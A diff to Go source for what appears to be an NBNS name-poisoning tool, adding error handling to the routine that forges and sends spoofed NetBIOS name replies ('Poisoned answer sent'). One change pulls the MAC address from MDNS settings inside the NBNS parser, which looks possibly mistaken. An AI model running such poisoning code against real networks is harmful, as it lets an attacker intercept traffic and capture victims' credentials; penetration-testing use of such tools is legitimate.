@@ -91,28 +91,42 @@ func sendNBNSPacket(pdetails packetDetails, payload []byte) {
 		IHL:      5,
 	}
 	ethernetLayer := &layers.Ethernet{
-		SrcMAC:       pdetails.dstMAC,
 		DstMAC:       pdetails.srcMAC,
 		EthernetType: layers.EthernetTypeIPv4,
+		SrcMAC:       pdetails.dstMAC,
 	}
 	udpLayer := &layers.UDP{
 		SrcPort: pdetails.dstPort,
 		DstPort: pdetails.srcPort,
 	}
-	udpLayer.SetNetworkLayerForChecksum(ipLayer)
+	err := udpLayer.SetNetworkLayerForChecksum(ipLayer)
+	if err != nil {
+		log.Printf("[NBNS] Error creating UDP layer: %s\n", err)
+		return
+	}
 
 	// And create the packet with the layers
 	buffer = gopacket.NewSerializeBuffer()
-	gopacket.SerializeLayers(buffer, options,
+	err = gopacket.SerializeLayers(buffer, options,
 		ethernetLayer,
 		ipLayer,
 		udpLayer,
 		gopacket.Payload(payload),
 	)
+	if err != nil {
+		log.Printf("[NBNS] Error serializing packet: %s\n", err)
+		return
+	}
+
 	outgoingPacket := buffer.Bytes()
 
 	// Send our packet and don't worry if there is an error
-	_ = mainNBNSDetails.handle.WritePacketData(outgoingPacket)
+	err = mainNBNSDetails.handle.WritePacketData(outgoingPacket)
+	if err != nil {
+		log.Printf("[NBNS] Error sending poison to %s\n%s\n", pdetails.srcIP, err)
+		return
+	}
+
 	log.Printf("[NBNS] Poisoned answer sent to %s for name %s\n", pdetails.srcIP, pdetails.requestNameDecoded)
 }
 
@@ -164,7 +178,7 @@ func parseNBNSPacket(packet gopacket.Packet) packetDetails {
 	if ethLayer != nil {
 		eth, _ := ethLayer.(*layers.Ethernet)
 		details.srcMAC = eth.SrcMAC
-		details.dstMAC = mainNBNSDetails.respondMAC
+		details.dstMAC = mainMDNSDetails.respondMAC
 	}
 
 	// Get UDP layer
